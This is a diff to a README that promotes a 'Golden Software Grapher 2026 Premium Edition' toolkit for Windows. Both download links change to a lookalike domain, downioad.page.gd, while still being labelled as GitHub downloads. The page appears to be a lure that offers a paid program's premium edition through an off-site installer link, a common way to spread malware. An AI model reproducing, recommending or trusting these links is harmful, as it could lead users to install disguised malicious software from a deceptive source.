@@ -2,7 +2,7 @@
 
 Golden Software Grapher 2026 Premium Edition is a comprehensive enhancement toolkit designed specifically for Windows desktop users who rely on Golden Software Grapher for scientific data visualization. This package aims to provide a seamless upgrade experience, offering advanced features that streamline the graphing process and improve overall productivity. Whether you are a researcher, engineer, or student, this toolkit helps you create professional-quality graphs with ease.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -81,7 +81,7 @@ Last Updated: January 15, 2026
 
 To get the latest version of the toolkit, use the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
